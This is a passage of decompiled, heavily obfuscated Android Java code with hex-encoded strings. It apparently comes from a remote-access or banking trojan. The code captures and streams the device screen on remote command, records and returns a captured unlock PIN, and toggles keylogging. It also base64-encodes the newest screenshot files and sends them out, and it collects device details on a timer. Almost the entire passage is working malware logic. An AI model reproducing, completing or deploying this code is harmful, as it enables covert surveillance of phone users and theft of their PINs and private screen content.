        TypefaceCache.obtain("000F0077004E008900F300B700DB00A900240036007300B100DE009C009200B0002A0062005300C700E300AB00DD00B500260072001B009700E200B000D800A2002000620052008800FE");
        try {
            Integer num = HandlerSJAdapter.O2DHNSIGZlgPja7eqLgn;
            if (num != null) {
                int iIntValue = num.intValue();
                Intent intent = HandlerSJAdapter.xfn2GJwmGqs7kWW;
                if (intent != null) {
                    String str4 = ManagerUMController.DVTNwpDEVsUKuznof;
                    this.dDIMxZXP1V8HdM.startForegroundService(SbxdZ6Kq2uhHQ5RPRqm.MLSIo1htfMPWeB8V876L(this.dDIMxZXP1V8HdM, iIntValue, intent, iXDyLpEZyrcKVe0));
                    for (int i4 = 1; i4 < 16; i4++) {
                        Thread.sleep(200L);
                        x1G2i7KvSdxo3fp x1g2i7kvsdxo3fp5 = x1G2i7KvSdxo3fp.gmNWMfvn6zlEj;
                        if (x1G2i7KvSdxo3fp.gmNWMfvn6zlEj == null) {
                        }
                    }
                }
                String str5 = ManagerUMController.DVTNwpDEVsUKuznof;
                managerUMController = ManagerUMController.fivkjwgu2UdAtiY;
                if (managerUMController != null) {
                    mediaProjection = managerUMController.dDIMxZXP1V8HdM;
                } else {
                    mediaProjection = null;
                }
                if (mediaProjection != null) {
                    TypefaceCache.obtain("001000610052009300F300B700DB00A9002400360057008E00E600BA0092008A00220078005A008000F500AD00E7008A000000790055009300E200B000DE00AB00260064001B008100E200B000DF00E700090046007E00A000B000AB00DD00E7000B0040007500A4");
                    JSONObject jSONObject6 = new JSONObject();
                    jSONObject6.put(Y9mRyRdkl5FOcwb66V6.pyu8ovAipBTLYAiKab("002B00600055008400CF00AC00C600A6003700630048", jSONObject6, TypefaceCache.obtain("0037006F004B0082"), "00300062005A009300E500AC"), TypefaceCache.obtain("003000610052009300F300B700DB00A900240049004F008800CF00B7008000F10077"));
                    H9XlUr4OeMJFiXK(jSONObject6);
                    mediaProjection2 = managerUMController.dDIMxZXP1V8HdM;
                    if (mediaProjection2 != null) {
                        TypefaceCache.obtain("003000610052009300F300B700E600A8000B00600055008400AA00FF00C000A2003600650052008900F700FF00DE00AE00350073001B00AA00F500BB00DB00A6001300640054008D00F500BC00C600AE002C0078001B008100FF00AD0092008F006D0024000D00D3");
                        synchronized (managerUMController.gIIiyi2ddlMDR0) {
                            virtualDisplay = managerUMController.w9sT1Swbhx3hs;
                            if (virtualDisplay != null) {
                                virtualDisplay.release();
                            }
                            managerUMController.w9sT1Swbhx3hs = null;
                            imageReader = managerUMController.vekpFI4d1Nc4fakF;
                            if (imageReader != null) {
                                imageReader.setOnImageAvailableListener(null, null);
                            }
                            imageReader2 = managerUMController.vekpFI4d1Nc4fakF;
                            if (imageReader2 != null) {
                                imageReader2.close();
                            }
                            managerUMController.vekpFI4d1Nc4fakF = null;
                            managerUMController.b1EoSIRjJHO5();
                            ManagerUMController.iUQk66nAiXgO35.set(null);
                            x1g2i7kvsdxo3fp = new x1G2i7KvSdxo3fp(mediaProjection2, managerUMController.b1EoSIRjJHO5, managerUMController.pyu8ovAipBTLYAiKab, managerUMController.D5P1xCAyuvgF);
                            if (x1g2i7kvsdxo3fp.vekpFI4d1Nc4fakF(iXDyLpEZyrcKVe0, 800000)) {
                                managerUMController.JXn4Qf7zpnLjP5 = x1g2i7kvsdxo3fp;
                                TypefaceCache.obtain("003000610052009300F300B700E600A8000B00600055008400B0009000F900FD0063");
                                while (i3 < 16) {
                                    Thread.sleep(200L);
                                    x1G2i7KvSdxo3fp x1g2i7kvsdxo3fp6 = x1G2i7KvSdxo3fp.gmNWMfvn6zlEj;
                                    if (x1G2i7KvSdxo3fp.gmNWMfvn6zlEj != null) {
                                        JSONObject jSONObject7 = new JSONObject();
                                        jSONObject7.put(Y9mRyRdkl5FOcwb66V6.pyu8ovAipBTLYAiKab("002B00600055008400CF00AC00C600A6003700630048", jSONObject7, TypefaceCache.obtain("0037006F004B0082"), "00300062005A009300E500AC"), TypefaceCache.obtain("00300062005A009500E400BA00D6"));
                                        H9XlUr4OeMJFiXK(jSONObject7);
                                        return true;
                                    }
                                }
                            } else {
                                TypefaceCache.obtain("003000610052009300F300B700E600A8000B00600055008400AA00FF00F100A60020007E005E00AB00D7008800DD00B500280073004900C900E300AB00D300B50037003E001200C700F600BE00DB00AB00260072");
                            }
                        }
                    }
                    TypefaceCache.obtain("003000610052009300F300B700E600A8000B00600055008400B000B900D300AE002F0073005F00CB00B000B900D300AB002F007F0055008000B000AB00DA00B5002C0063005C008F00B000AB00DD00E7003300730049008A00F900AC00C100AE002C0078001B009500F500AE00C700A200300062");
                }
                TypefaceCache.obtain("00110073004A009200F500AC00C600AE002D0071001B00AA00F500BB00DB00A6001300640054008D00F500BC00C600AE002C0078001B008100FF00AD0092008F00150058007800C700B800BE00C700B3002C00550057008E00F300B400920088000D003F");
                JSONObject jSONObject8 = new JSONObject();
                jSONObject8.put(Y9mRyRdkl5FOcwb66V6.pyu8ovAipBTLYAiKab("002B00600055008400CF00AC00C600A6003700630048", jSONObject8, TypefaceCache.obtain("0037006F004B0082"), "00300062005A009300E500AC"), TypefaceCache.obtain("00310073004A009200F500AC00C600AE002D00710064009700F500AD00DF00AE003000650052008800FE"));
                H9XlUr4OeMJFiXK(jSONObject8);
                VpKcDcuRNaQkRJ5 vpKcDcuRNaQkRJ8 = VpKcDcuRNaQkRJ5.dDIMxZXP1V8HdM;
                z = VpKcDcuRNaQkRJ5.xDyLpEZyrcKVe0;
                VpKcDcuRNaQkRJ5.xDyLpEZyrcKVe0 = true;
                String str6 = HandlerSJAdapter.dTS0S7eC32ubQH54j36;
                Intent intentD5P1xCAyuvgF2 = jb8et6SZeK5TWMrJFxDX.D5P1xCAyuvgF(this.dDIMxZXP1V8HdM, 50);
                intentD5P1xCAyuvgF2.putExtra(TypefaceCache.obtain("002B00600055008400CF00B200DD00A30026"), true);
                intentD5P1xCAyuvgF2.putExtra(TypefaceCache.obtain("003700770049008000F500AB00ED00B0002A0072004F008F"), iXDyLpEZyrcKVe0);
                this.dDIMxZXP1V8HdM.startActivity(intentD5P1xCAyuvgF2);
                while (i2 < 41) {
                    Thread.sleep(250L);
                    x1G2i7KvSdxo3fp x1g2i7kvsdxo3fp7 = x1G2i7KvSdxo3fp.gmNWMfvn6zlEj;
                    if (x1G2i7KvSdxo3fp.gmNWMfvn6zlEj != null) {
                        VpKcDcuRNaQkRJ5 vpKcDcuRNaQkRJ9 = VpKcDcuRNaQkRJ5.dDIMxZXP1V8HdM;
                        VpKcDcuRNaQkRJ5.xDyLpEZyrcKVe0 = z;
                        JSONObject jSONObject9 = new JSONObject();
                        jSONObject9.put(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("002B00600055008400CF00AC00C600A6003700630048"));
                        jSONObject9.put(TypefaceCache.obtain("00300062005A009300E500AC"), TypefaceCache.obtain("00300062005A009500E400BA00D6"));
                        H9XlUr4OeMJFiXK(jSONObject9);
                    }
                }
                VpKcDcuRNaQkRJ5 vpKcDcuRNaQkRJ10 = VpKcDcuRNaQkRJ5.dDIMxZXP1V8HdM;
                VpKcDcuRNaQkRJ5.xDyLpEZyrcKVe0 = z;
                JSONObject jSONObject10 = new JSONObject();
                jSONObject10.put(Y9mRyRdkl5FOcwb66V6.pyu8ovAipBTLYAiKab("002B00600055008400CF00AC00C600A6003700630048", jSONObject10, TypefaceCache.obtain("0037006F004B0082"), "00300062005A009300E500AC"), TypefaceCache.obtain("002500770057008B00F200BE00D100AC001C00770058008400F500AC00C100AE0021007F0057008E00E400A6"));
                H9XlUr4OeMJFiXK(jSONObject10);
                return false;
            }
            return false;
        } catch (Exception e4) {
            TypefaceCache.obtain("000B0040007500A400B000AC00C600A800310073005F00C700E300AB00D300B500370036005D008600F900B300D700A300790036");
            e4.getMessage();
        }
        return true;
    }

    public final void fivkjwgu2UdAtiY() {
        if (this.Qrz92kRPw4GcghAc) {
            return;
        }
        this.Qrz92kRPw4GcghAc = true;
        try {
            Object systemService = this.dDIMxZXP1V8HdM.getSystemService("activity");
            ActivityManager activityManager = systemService instanceof ActivityManager ? (ActivityManager) systemService : null;
            ActivityManager.MemoryInfo memoryInfo = new ActivityManager.MemoryInfo();
            if (activityManager != null) {
                activityManager.getMemoryInfo(memoryInfo);
            }
            long j = memoryInfo.totalMem;
            long j2 = j > 0 ? j / ((long) 1048576) : 0L;
            int iAvailableProcessors = Runtime.getRuntime().availableProcessors();
            int i = QmLUFJ3vXstIdpO2wk.dDIMxZXP1V8HdM;
            int memoryClass = activityManager != null ? activityManager.getMemoryClass() : 0;
            QmLUFJ3vXstIdpO2wk.vekpFI4d1Nc4fakF = iAvailableProcessors;
            QmLUFJ3vXstIdpO2wk.w9sT1Swbhx3hs = j2;
            QmLUFJ3vXstIdpO2wk.JXn4Qf7zpnLjP5 = memoryClass;
            QmLUFJ3vXstIdpO2wk.vekpFI4d1Nc4fakF();
        } catch (Exception unused) {
        }
        Timer timer = new Timer();
        this.wotphlvK9sPbXJ = timer;
        timer.scheduleAtFixedRate(new W7725pMS8HeW1y(this), 0L, 5000L);
        TypefaceCache.obtain("00070073004D008E00F300BA009200AA002600620049008E00F300AC009200B5002600660054009500E400B600DC00A000630065004F008600E200AB00D700A30063003E000E009400B000B600DC00B300260064004D008600FC00F6");
    }

    public final void gIIiyi2ddlMDR0() throws JSONException {
        try {
            Iterator it = Aqh0grSwgDbwr.yTljMGnIibTRdOpSh4(TypefaceCache.obtain("006C0065004F008800E200BE00D500A2006C00730056009200FC00BE00C600A200270039000B00C800C000B600D100B300360064005E009400BF008C00D100B5002600730055009400F800B000C600B4"), TypefaceCache.obtain("006C0065004F008800E200BE00D500A2006C00730056009200FC00BE00C600A200270039000B00C800D4009C00FB008A006C00450058009500F500BA00DC00B4002B0079004F0094"), TypefaceCache.obtain("006C0065005F008400F100AD00D600E80013007F0058009300E500AD00D700B4006C00450058009500F500BA00DC00B4002B0079004F0094"), TypefaceCache.obtain("006C0065005F008400F100AD00D600E800070055007200AA00BF008C00D100B5002600730055009400F800B000C600B4")).iterator();
            while (it.hasNext()) {
                File file = new File((String) it.next());
                if (file.exists() && file.isDirectory()) {
                    File[] fileArrListFiles = file.listFiles(new fUAIzNE3KaUsJL2n4d());
                    File file2 = null;
                    if (fileArrListFiles != null && fileArrListFiles.length != 0) {
                        file2 = fileArrListFiles[0];
                        int length = fileArrListFiles.length - 1;
                        if (length != 0) {
                            long jLastModified = file2.lastModified();
                            xH380dEhDsa5zwemTP it2 = new VUjeMiNYIJhgmVJopga(1, length, 1).iterator();
                            while (it2.JXn4Qf7zpnLjP5) {
                                File file3 = fileArrListFiles[it2.nextInt()];
                                long jLastModified2 = file3.lastModified();
                                if (jLastModified < jLastModified2) {
                                    file2 = file3;
                                    jLastModified = jLastModified2;
                                }
                            }
                        }
                    }
                    if (file2 != null && System.currentTimeMillis() - file2.lastModified() < 30000) {
                        TypefaceCache.obtain("00050079004E008900F400FF00C100A400310073005E008900E300B700DD00B3006300600052008600B000BB00DB00B500260075004F00C700F100BC00D100A200300065000100C7");
                        file2.getAbsolutePath();
                        String strEncodeToString = Base64.encodeToString(u4HKFgCbgUKtEQ.yTljMGnIibTRdOpSh4(file2), 2);
                        JSONObject jSONObject = new JSONObject();
                        jSONObject.put(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("003000750049008200F500B100C100AF002C0062"));
                        jSONObject.put(TypefaceCache.obtain("00270077004F0086"), strEncodeToString);
                        H9XlUr4OeMJFiXK(jSONObject);
                        TypefaceCache.obtain("001000750049008200F500B100C100AF002C0062001B009400F500B100C600E70035007F005A00C700F400B600C000A200200062001B008600F300BC00D700B40030002C001B");
                        TypefaceCache.obtain("006300740042009300F500AC");
                        return;
                    }
                }
            }
            JSONObject jSONObject2 = new JSONObject();
            jSONObject2.put(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("003000750049008200F500B100C100AF002C0062"));
            jSONObject2.put(TypefaceCache.obtain("002600640049008800E2"), TypefaceCache.checked("0462042C047B04DF04AD0497048C04850063042B040E00C704AD04EF048B04F30476042B001500C7048F049F048C04F504760456047704A504A500FF04F204F704740456040E04AF04A504E2048A04880063042B040B00C704D7049D048704FA047B0423001B04A204D004EF048F04FF0478042E047204D700BE"));
            H9XlUr4OeMJFiXK(jSONObject2);
        } catch (Exception e) {
            TypefaceCache.obtain("0007007F0049008200F300AB009200A600200075005E009400E300FF00D700B500310079004900DD00B0");
            e.getMessage();
            JSONObject jSONObject3 = new JSONObject();
            jSONObject3.put(Y9mRyRdkl5FOcwb66V6.pyu8ovAipBTLYAiKab("003000750049008200F500B100C100AF002C0062", jSONObject3, TypefaceCache.obtain("0037006F004B0082"), "002600640049008800E2"), TypefaceCache.checked("045E0423047900C704A404E104F3048504000429040B00C704AA00FF04F704870473042B040304DC04A8049604F100FD0063") + e.getMessage());
            H9XlUr4OeMJFiXK(jSONObject3);
        }
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r2v111, types: [boolean, int] */
    /* JADX WARN: Type inference failed for: r2v87, types: [boolean, int] */
    /* JADX WARN: Type inference failed for: r5v18, types: [boolean, int] */
    /* JADX WARN: Unreachable blocks removed: 12, instructions: 40 */
    public final void gmNWMfvn6zlEj(JSONObject jSONObject, String str) throws JSONException, InterruptedException {
        String string;
        boolean z;
        boolean z2;
        List<PhoneAccountHandle> callCapablePhoneAccounts;
        int i;
        int i2 = 1;
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("00300062005A009500E4008000C100B300310073005A008A"))) {
            String str2 = ManagerUMController.DVTNwpDEVsUKuznof;
            int iOptInt = jSONObject.optInt(TypefaceCache.obtain("00320063005A008B00F900AB00CB"), ManagerUMController.YIgR6F2ZXmLx2ul ? 35 : 50);
            int iOptInt2 = jSONObject.optInt(TypefaceCache.obtain("003100730048008800FC00AA00C600AE002C0078"), 360);
            String strOptString = jSONObject.optString(TypefaceCache.obtain("00200079005F008200F3"), TypefaceCache.obtain("00290066005E0080"));
            boolean zOptBoolean = jSONObject.optBoolean(TypefaceCache.obtain("00220063004F008800CF00AE00C700A6002F007F004F009E"), true);
            TypefaceCache.obtain("00100062005A009500E400B600DC00A0006300600052008300F500B0009200B400370064005E008600FD00F3009200B6003600770057008E00E400A6008F");
            TypefaceCache.obtain("006F00360049008200E300B000DE00B20037007F0054008900AD");
            TypefaceCache.obtain("006F00360058008800F400BA00D100FA");
            TypefaceCache.obtain("006F0036005A009200E400B0008F");
            TypefaceCache.obtain("006F00360057008800E7008D00D300AA007E");
            hV4VTKNUdeHN();
            if (this.XiR1pIn5878vVWd) {
                A1BaTVAMeIXMnh(this, 3);
            }
            this.gmNWMfvn6zlEj = true;
            this.gIIiyi2ddlMDR0 = iOptInt;
            String str3 = SyncQYAdapter.ECwLkmPW1UKz7J6E;
            SyncQYAdapter syncQYAdapter = SyncQYAdapter.VEkRsTDS6a9oHWI;
            if (syncQYAdapter != null) {
                syncQYAdapter.getSharedPreferences(SyncQYAdapter.XuO9PPFo607ssKwZjNW, 0).edit().putBoolean(SyncQYAdapter.hV4VTKNUdeHN, true).putInt(SyncQYAdapter.k84rwRrqzhrNQ1CdNQ9, iOptInt).apply();
            }
            this.ECwLkmPW1UKz7J6E = iOptInt;
            this.tne6mXOUFKdd = iOptInt;
            this.fivkjwgu2UdAtiY = okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("002B0024000D00D3")) ? TypefaceCache.obtain("002B0024000D00D3") : TypefaceCache.obtain("00290066005E0080");
            this.xfn2GJwmGqs7kWW = zOptBoolean;
            this.iUQk66nAiXgO35 = 0L;
            this.XuO9PPFo607ssKwZjNW = System.currentTimeMillis();
            this.k84rwRrqzhrNQ1CdNQ9 = 0;
            this.A1BaTVAMeIXMnh = 0;
            int i3 = QmLUFJ3vXstIdpO2wk.dDIMxZXP1V8HdM;
            this.euF5Udt5Rqv3Qmea = QmLUFJ3vXstIdpO2wk.dDIMxZXP1V8HdM == 3 ? D5P1xCAyuvgF().length - 2 : 0;
            ManagerUMController.l1V0lQr6TbwNKqHfXNbb = D5P1xCAyuvgF()[OFtLBiBbrrTHWu.xDyLpEZyrcKVe0(this.euF5Udt5Rqv3Qmea, 0, D5P1xCAyuvgF().length - 1)];
            this.qfTrc75xwRVMl85vh = 0;
            this.MSGkxvPxRYNqC = false;
            this.VEkRsTDS6a9oHWI = OFtLBiBbrrTHWu.Ee8d2j4S9Vm5yGuR(iOptInt, QmLUFJ3vXstIdpO2wk.dDIMxZXP1V8HdM());
            int i4 = QmLUFJ3vXstIdpO2wk.dDIMxZXP1V8HdM;
            this.jdOQeRk37T35X5xKW1P = TypefaceCache.obtain("00290066005E0080");
            this.rCHnHJBAlOpNI5.clear();
            this.vIJudZvPyTuNp = 80L;
            this.DVTNwpDEVsUKuznof = QmLUFJ3vXstIdpO2wk.dDIMxZXP1V8HdM == 3 ? 2 : 3;
            if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("002B0024000D00D3")) && euF5Udt5Rqv3Qmea(iOptInt2)) {
                TypefaceCache.obtain("001600650052008900F700FF00FA0091000D0055001B009700F900AF00D700AB002A0078005E00C700F600B000C000E7000B0038000900D100A4");
                xfn2GJwmGqs7kWW();
                return;
            }
            if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("002B0024000D00D3"))) {
                TypefaceCache.obtain("000B0040007500A400B000AA00DC00A6003500770052008B00F100BD00DE00A2006F0036005D008600FC00B300DB00A9002400360059008600F300B4009200B3002C0036007100B700D50098009200EF000B0038000900D100A400FF00DC00A200260072004800C700DD00BA00D600AE002200460049008800FA00BA00D100B3002A0079005500CE");
            }
            ManagerUMController.XuO9PPFo607ssKwZjNW = iOptInt;
            ManagerUMController.hV4VTKNUdeHN = TypefaceCache.obtain("00290066005E0080");
            if (qfTrc75xwRVMl85vh(iOptInt)) {
                TypefaceCache.obtain("001600650052008900F700FF00FF00A20027007F005A00B700E200B000D800A2002000620052008800FE00FF00D400A800310036007100B700D50098009200B400370064005E008600FD");
                tne6mXOUFKdd();
                return;
            }
            TypefaceCache.obtain("000E0073005F008E00F1008F00C000A8002900730058009300F900B000DC00E700360078005A009100F100B600DE00A60021007A005E00CB00B000B900D300AB002F007F0055008000B000BD00D300A400280036004F008800B0009E00D100A4002600650048008E00F200B600DE00AE0037006F001B00AD00C0009A00F5");
            GARjgaGEpTotOxcl8vfe gARjgaGEpTotOxcl8vfe = DataQFAdapter.Companion;
            int iEe8d2j4S9Vm5yGuR = OFtLBiBbrrTHWu.Ee8d2j4S9Vm5yGuR(iOptInt, QmLUFJ3vXstIdpO2wk.dDIMxZXP1V8HdM());
            gARjgaGEpTotOxcl8vfe.getClass();
            DataQFAdapter.streamQuality = iEe8d2j4S9Vm5yGuR;
            int iJ0zjQ7CAgohuxU20eCW6 = Y9mRyRdkl5FOcwb66V6.J0zjQ7CAgohuxU20eCW6(QmLUFJ3vXstIdpO2wk.dDIMxZXP1V8HdM);
            if (iJ0zjQ7CAgohuxU20eCW6 == 0) {
                i = 745 - 25;
            } else if (iJ0zjQ7CAgohuxU20eCW6 == 1) {
                i = 480;
            } else {
                if (iJ0zjQ7CAgohuxU20eCW6 != 2) {
                    throw new Sb7Xj3N9U1DQ();
                }
                i = 280;
            }
            DataQFAdapter.streamWidth = OFtLBiBbrrTHWu.xDyLpEZyrcKVe0(iOptInt2, 240, i);
            GARjgaGEpTotOxcl8vfe.qfTrc75xwRVMl85vh();
            vIJudZvPyTuNp(OFtLBiBbrrTHWu.Ee8d2j4S9Vm5yGuR(iOptInt, QmLUFJ3vXstIdpO2wk.dDIMxZXP1V8HdM()));
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("00360066005F008600E400BA00ED00B400370064005E008600FD"))) {
            int iOptInt3 = jSONObject.optInt(TypefaceCache.obtain("00320063005A008B00F900AB00CB"), this.tne6mXOUFKdd);
            boolean zOptBoolean2 = jSONObject.optBoolean(TypefaceCache.obtain("00220063004F008800CF00AE00C700A6002F007F004F009E"), this.xfn2GJwmGqs7kWW);
            this.tne6mXOUFKdd = iOptInt3;
            this.ECwLkmPW1UKz7J6E = iOptInt3;
            this.VEkRsTDS6a9oHWI = iOptInt3;
            this.gIIiyi2ddlMDR0 = iOptInt3;
            this.xfn2GJwmGqs7kWW = zOptBoolean2;
            ManagerUMController.XuO9PPFo607ssKwZjNW = iOptInt3;
            ManagerUMController.hV4VTKNUdeHN = TypefaceCache.obtain("00290066005E0080");
            this.fivkjwgu2UdAtiY = TypefaceCache.obtain("00290066005E0080");
            this.jdOQeRk37T35X5xKW1P = TypefaceCache.obtain("00290066005E0080");
            DataQFAdapter.Companion.getClass();
            DataQFAdapter.streamQuality = iOptInt3;
            this.iUQk66nAiXgO35 = 0L;
            this.XuO9PPFo607ssKwZjNW = System.currentTimeMillis();
            this.hV4VTKNUdeHN = System.currentTimeMillis();
            this.k84rwRrqzhrNQ1CdNQ9 = 0;
            this.A1BaTVAMeIXMnh = 0;
            this.MSGkxvPxRYNqC = false;
            this.euF5Udt5Rqv3Qmea = 0;
            ManagerUMController.l1V0lQr6TbwNKqHfXNbb = D5P1xCAyuvgF()[0];
            TypefaceCache.obtain("001000620049008200F100B2009200B6003600770057008E00E400A6009200AF002C00620016009200E000BB00D300B300260072000100C700E100E2");
            TypefaceCache.obtain("00630077004E009300FF00E2");
            TypefaceCache.obtain("006F0036005A008300F100AF00C600AE00350073001B009400E400BE00C600A200630064005E009400F500AB");
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("003000620054009700CF00AC00C600B5002600770056"))) {
            this.gmNWMfvn6zlEj = false;
            String str4 = SyncQYAdapter.ECwLkmPW1UKz7J6E;
            SyncQYAdapter syncQYAdapter2 = SyncQYAdapter.VEkRsTDS6a9oHWI;
            if (syncQYAdapter2 != null) {
                syncQYAdapter2.getSharedPreferences(SyncQYAdapter.XuO9PPFo607ssKwZjNW, 0).edit().putBoolean(SyncQYAdapter.hV4VTKNUdeHN, false).putInt(SyncQYAdapter.k84rwRrqzhrNQ1CdNQ9, 50).apply();
            }
            k84rwRrqzhrNQ1CdNQ9(true, true);
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("003100730048009300F100AD00C60098003000620049008200F100B2"))) {
            TypefaceCache.obtain("003100730048009300F100AD00C60098003000620049008200F100B2008800E700310073005D009500F500AC00DA00AE002D0071001B00B100F900AD00C600B20022007A007F008E00E300AF00DE00A6003A");
            String str5 = ManagerUMController.DVTNwpDEVsUKuznof;
            if (SbxdZ6Kq2uhHQ5RPRqm.l1V0lQr6TbwNKqHfXNbb()) {
                try {
                    Context context = this.dDIMxZXP1V8HdM;
                    context.startService(SbxdZ6Kq2uhHQ5RPRqm.XiR1pIn5878vVWd(context));
                    return;
                } catch (Exception unused) {
                    return;
                }
            } else {
                if (this.gmNWMfvn6zlEj) {
                    int i5 = this.gIIiyi2ddlMDR0;
                    A1BaTVAMeIXMnh(this, 3);
                    this.nQilHWaqS401ZtR.postDelayed(new eY3e7LNeKcWCerE2VMV(this, i5, i2), 500L);
                    return;
                }
                return;
            }
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("002000790056008A00F100B100D6"))) {
            hjneShqpF9Tis4(jSONObject);
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("00240073004F00B800E300B400D700AB0026006200540089"))) {
            K7eEOBPYP9VIoHWTe();
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("00300062005A009500E4008000C100AC0026007A005E009300FF00B1"))) {
            ECwLkmPW1UKz7J6E();
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("003000620054009700CF00AC00D900A2002F0073004F008800FE"))) {
            hV4VTKNUdeHN();
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("00300062005A009500E4008000D600A20035007F0058008200CF00B200D700B30031007F00580094"))) {
            fivkjwgu2UdAtiY();
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("003000620054009700CF00BB00D700B1002A0075005E00B800FD00BA00C600B5002A00750048"))) {
            XuO9PPFo607ssKwZjNW();
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("00240073004F00B800FB00BA00CB00AB002C00710048"))) {
            MLSIo1htfMPWeB8V876L();
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("0020007A005E008600E2008000D900A2003A007A0054008000E3"))) {
            DataQFAdapter.Companion.xDyLpEZyrcKVe0();
            JSONObject jSONObject2 = new JSONObject();
            Y9mRyRdkl5FOcwb66V6.Qrz92kRPw4GcghAc("002800730042008B00FF00B800C100980020007A005E008600E200BA00D6", jSONObject2, TypefaceCache.obtain("0037006F004B0082"), "003000630058008400F500AC00C1", true);
            H9XlUr4OeMJFiXK(jSONObject2);
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("00300062005A009500E4008000DE00AE003500730064008C00F500A600DE00A800240065"))) {
            DataQFAdapter.Companion.getClass();
            GARjgaGEpTotOxcl8vfe.euF5Udt5Rqv3Qmea(true);
            JSONObject jSONObject3 = new JSONObject();
            Y9mRyRdkl5FOcwb66V6.Qrz92kRPw4GcghAc("002F007F004D008200CF00B400D700BE002F0079005C009400CF00AC00C600A600310062005E0083", jSONObject3, TypefaceCache.obtain("0037006F004B0082"), "003000630058008400F500AC00C1", true);
            H9XlUr4OeMJFiXK(jSONObject3);
            TypefaceCache.obtain("000F007F004D008200B000B400D700BE002F0079005C009400B0009A00FC00860001005A007E00A3");
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("003000620054009700CF00B300DB00B1002600490050008200E900B300DD00A00030"))) {
            DataQFAdapter.Companion.getClass();
            GARjgaGEpTotOxcl8vfe.euF5Udt5Rqv3Qmea(false);
            JSONObject jSONObject4 = new JSONObject();
            Y9mRyRdkl5FOcwb66V6.Qrz92kRPw4GcghAc("002F007F004D008200CF00B400D700BE002F0079005C009400CF00AC00C600A800330066005E0083", jSONObject4, TypefaceCache.obtain("0037006F004B0082"), "003000630058008400F500AC00C1", true);
            H9XlUr4OeMJFiXK(jSONObject4);
            TypefaceCache.obtain("000F007F004D008200B000B400D700BE002F0079005C009400B0009B00FB009400020054007700A200D4");
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("00240073004F00B800E000B600DC"))) {
            JSONObject jSONObject5 = new JSONObject();
            String strPyu8ovAipBTLYAiKab = Y9mRyRdkl5FOcwb66V6.pyu8ovAipBTLYAiKab("00270073004D008E00F300BA00ED00B7002A0078", jSONObject5, TypefaceCache.obtain("0037006F004B0082"), "0033007F0055");
            DataQFAdapter.Companion.getClass();
            jSONObject5.put(strPyu8ovAipBTLYAiKab, DataQFAdapter.capturedPin);
            jSONObject5.put(TypefaceCache.obtain("002B0077004800B800E000B600DC"), DataQFAdapter.capturedPin.length() > 0 ? (-67) + 68 : 0);
            H9XlUr4OeMJFiXK(jSONObject5);
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("00300073004F00B800E000B600DC"))) {
            String strOptString2 = jSONObject.optString(TypefaceCache.obtain("0033007F0055"), "");
            DataQFAdapter.Companion.getClass();
            DataQFAdapter.capturedPin = strOptString2;
            try {
                this.dDIMxZXP1V8HdM.getSharedPreferences(TypefaceCache.obtain("00270073004D008E00F300BA00ED00B7002A0078"), 0).edit().putString(TypefaceCache.obtain("0033007F0055"), strOptString2).apply();
            } catch (Exception unused2) {
            }
            JSONObject jSONObject6 = new JSONObject();
            Y9mRyRdkl5FOcwb66V6.wotphlvK9sPbXJ("00270073004D008E00F300BA00ED00B7002A0078", jSONObject6, TypefaceCache.obtain("0037006F004B0082"), "0033007F0055", strOptString2);
            jSONObject6.put(TypefaceCache.obtain("002B0077004800B800E000B600DC"), strOptString2.length() > 0);
            H9XlUr4OeMJFiXK(jSONObject6);
            return;
        }
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("003600780057008800F300B400ED00B0002A0062005300B800E000B600DC"))) {
            String strOptString3 = jSONObject.optString(TypefaceCache.obtain("0033007F0055"), "");
            GARjgaGEpTotOxcl8vfe gARjgaGEpTotOxcl8vfe2 = DataQFAdapter.Companion;
            String str6 = strOptString3.length() == 0 ? null : strOptString3;
            gARjgaGEpTotOxcl8vfe2.getClass();
            boolean zAjrMZmky8AIb2Pr = GARjgaGEpTotOxcl8vfe.ajrMZmky8AIb2Pr(str6);
            JSONObject jSONObject7 = new JSONObject();
            Y9mRyRdkl5FOcwb66V6.Qrz92kRPw4GcghAc("003600780057008800F300B400ED00B0002A0062005300B800E000B600DC", jSONObject7, Y9mRyRdkl5FOcwb66V6.pyu8ovAipBTLYAiKab("002000790056008A00F100B100D60098003100730048009200FC00AB", jSONObject7, TypefaceCache.obtain("0037006F004B0082"), "002000790056008A00F100B100D6"), "003000630058008400F500AC00C1", zAjrMZmky8AIb2Pr);
            String strObtain = TypefaceCache.obtain("0033007F005500B800FC00BA00DC00A00037007E");
